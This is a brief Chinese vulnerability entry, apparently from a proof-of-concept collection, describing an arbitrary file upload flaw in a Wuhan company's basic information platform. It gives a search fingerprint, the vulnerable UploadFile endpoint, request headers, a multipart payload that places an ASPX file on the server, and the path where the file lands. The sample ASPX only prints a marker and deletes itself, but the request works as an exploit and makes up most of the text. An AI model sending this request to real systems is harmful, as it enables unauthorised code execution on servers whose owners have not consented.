# 武汉地大信息工程股份有限公司基础信息平台UploadFile存在任意文件上传漏洞

- **系统**：武汉地大信息工程股份有限公司基础信息平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/SystemManage/BaseProject"`
- **请求**：`POST /SystemManage/BaseProject/UploadFile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3eAFYzQh…`　`Cookie: ASP.NET_SessionId=3xa5xt4ordsw2seoftjsfrrl`　`Content-Length: 284`

**请求体 / payload**
```
------WebKitFormBoundary3eAFYzQhNgj7Q4xh
Content-Disposition: form-data; name="file"；filename="test.aspx"
<%@ Page Language="C#"%><% Response.Write("123456789"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundary3eAFYzQhNgj7Q4xh--
上传定位：/Content/images/projectImage/test.aspx
```
- **预期**：200　|　—